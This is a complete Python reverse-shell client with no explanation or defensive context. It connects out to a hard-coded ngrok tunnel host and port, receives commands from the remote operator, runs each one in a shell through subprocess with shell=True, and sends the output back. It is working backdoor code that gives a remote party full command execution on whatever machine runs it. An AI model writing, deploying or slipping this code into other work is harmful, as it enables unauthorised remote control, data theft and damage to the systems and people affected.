#!/usr/bin/env python3

import sys
import socket
import subprocess

def getstr(string, start, end, i=1):
    try:
        result = string.split(start)
        result = result[i].split(end)[1]

    except Exception as e:
        result = "ERRO: " + str(e)

    return result


HOST = sys.argv[1] if len(sys.argv) > 1 else '4.tcp.ngrok.io'
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 15155)

s = socket.socket()
s.connect((HOST, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(1024).decode()

    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    elif "msg=" in cmd.lower():
        print(getstr(cmd, "msg=", '"'))
        result = "OK".encode()

    else:
        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)

        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = 'OK'.encode()

    s.send(result)

s.close()